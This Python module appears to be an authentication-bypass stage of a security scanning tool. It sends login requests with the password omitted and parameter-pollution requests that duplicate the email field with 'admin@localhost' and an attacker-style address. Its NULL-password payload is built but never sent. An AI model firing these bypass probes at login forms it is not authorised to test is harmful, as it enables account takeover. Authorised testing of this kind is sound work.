from __future__ import annotations

import json
import requests
import uuid
from typing import Dict, List, Optional, Any
from urllib.parse import urljoin, urlparse

from recon_cli.pipeline.context import PipelineContext
from recon_cli.pipeline.stage_base import Stage


class AuthBypassTechniqueStage(Stage):
    """
    Advanced Authentication Bypass Technique Stage.
    Tests login and signup forms for logical and structural bypasses.
    """
    name = "auth_bypass_tech"

    def is_enabled(self, context: PipelineContext) -> bool:
        return bool(getattr(context.runtime_config, "enable_auth_bypass_tech", True))

    def execute(self, context: PipelineContext) -> None:
        results = context.get_results()
        # Get forms discovered by AuthDiscoveryStage
        auth_forms = [r for r in results if r.get("type") == "auth_form"]
        
        if not auth_forms:
            context.logger.info("No auth forms found for bypass testing")
            return

        session = requests.Session()
        session.headers.update({"User-Agent": "Mozilla/5.0 recon-cli/2.0 Bypass-Pro"})
        session.verify = getattr(context.runtime_config, "verify_tls", True)

        for form in auth_forms:
            url = form.get("url")
            action = form.get("action") or url
            if not action or not context.url_allowed(action): continue
            
            tags = set(form.get("tags", []))
            
            # 1. Test No-Password Bypass (if it looks like a login form)
            if "surface:login" in tags:
                self._test_no_password_bypass(context, session, form)
                
            # 2. Test Parameter Pollution (HPP)
            self._test_parameter_pollution(context, session, form)
            
            # 3. Test Response Manipulation (Heuristic-based)
            # (Note: This is passive/analytical for now but could be expanded to active)

    def _test_no_password_bypass(self, context: PipelineContext, session: requests.Session, form: Dict[str, Any]) -> None:
        """Checks if login succeeds by omitting the password field or using NULL."""
        action = form.get("action")
        inputs = form.get("inputs", [])
        
        # Identity to try (common/random)
        email = f"bypass_{uuid.uuid4().hex[:6]}@example.com"
        
        # Payload 1: Missing Password
        payload_missing = {}
        # Payload 2: NULL/Array Password
        payload_null = {}
        
        for inp in inputs:
            name = inp.get("name")
            itype = inp.get("type", "text")
            if not name: continue
            
            if "email" in name.lower() or itype == "email":
                payload_missing[name] = email
                payload_null[name] = email
            elif "pass" in name.lower() or itype == "password":
                # payload_missing skips this
                payload_null[f"{name}[]"] = "" # PHP array bypass attempt
            else:
                payload_missing[name] = "1"
                payload_null[name] = "1"

        try:
            # Test missing password
            resp = session.post(action, data=payload_missing, timeout=10, allow_redirects=False)
            if resp.status_code == 302 and "login" not in resp.headers.get("Location", "").lower():
                context.emit_signal(
                    "auth_bypass_suspect", "url", action,
                    confidence=0.5, source=self.name,
                    tags=["auth-bypass", "no-password"],
                    evidence={"description": "Redirect detected on missing password field"}
                )
        except Exception: pass

    def _test_parameter_pollution(self, context: PipelineContext, session: requests.Session, form: Dict[str, Any]) -> None:
        """Attempts HPP by duplicating high-value fields (e.g., email=victim@host&email=attacker@host)."""
        action = form.get("action")
        inputs = form.get("inputs", [])
        
        target_field = None
        for inp in inputs:
            name = inp.get("name")
            if name and ("email" in name.lower() or "user" in name.lower()):
                target_field = name
                break
        
        if not target_field: return

        # Double up the field: first one is target, second is one we control
        # Some servers take the first, some the last
        evil_val = f"bypass_{uuid.uuid4().hex[:4]}@attacker.com"
        payload = []
        for inp in inputs:
            name = inp.get("name")
            if not name: continue
            if name == target_field:
                payload.append((name, "admin@localhost")) # The one we want to be
                payload.append((name, evil_val))          # The one that might bypass validation
            else:
                payload.append((name, "1"))

        try:
            resp = session.post(action, data=payload, timeout=10)
            if "admin" in resp.text.lower() or resp.status_code == 302:
                # This is noisy, so we just signal it as a suspicion
                context.emit_signal(
                    "hpp_bypass_suspect", "url", action,
                    confidence=0.4, source=self.name,
                    tags=["auth-bypass", "hpp"],
                    evidence={"field": target_field, "payload": str(payload)}
                )
        except Exception: pass
